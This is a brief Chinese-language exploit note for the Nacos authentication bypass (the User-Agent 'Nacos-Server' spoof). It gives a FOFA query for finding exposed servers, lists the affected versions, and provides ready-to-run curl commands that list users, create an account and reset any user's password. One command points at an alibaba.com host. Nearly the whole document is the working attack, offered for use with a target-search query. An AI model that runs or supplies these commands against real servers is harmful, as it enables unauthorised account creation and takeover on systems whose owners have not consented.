# Nacos Bypass身份验证


fofa：

```
title="Nacos" || icon_hash="1227052603"
```

**影响范围：**

* 2.0.0-ALPHA.1
* 1.xx

**漏洞验证：**


```bash
访问用户列表界面
curl XGET 'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9' -H 'User-Agent: Nacos-Server'

添加新用户
curl -XPOST 'http://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test' -H 'User-Agent: Nacos-Server'

查看用户列表
curl XGET 'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9' -H 'User-Agent: Nacos-Server'

任意密码重置:
curl -XPUT https://test.alibaba.com/nacos/v1/auth/users -d "username=nacos&newPassword=SomeNewPass11222"
```

from:https://github.com/alibaba/nacos/issues/4593

ref：https://forum.ywhack.com/thread-114954-1-1.html
